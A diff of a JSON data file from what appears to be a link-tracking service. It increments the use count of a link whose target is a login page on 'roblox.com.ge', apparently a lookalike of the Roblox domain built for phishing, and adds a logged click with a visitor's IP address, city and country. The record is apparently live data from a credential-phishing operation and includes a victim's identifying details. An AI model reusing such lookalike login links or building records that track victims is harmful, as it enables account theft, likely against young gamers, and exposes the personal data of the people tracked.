@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1396,
+    "useCount": 1397,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11336,6 +11336,14 @@
         "city": "Diamantina",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777425905117,
+        "ip": "49.150.207.63",
+        "country": "Philippines",
+        "city": "Baguio City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
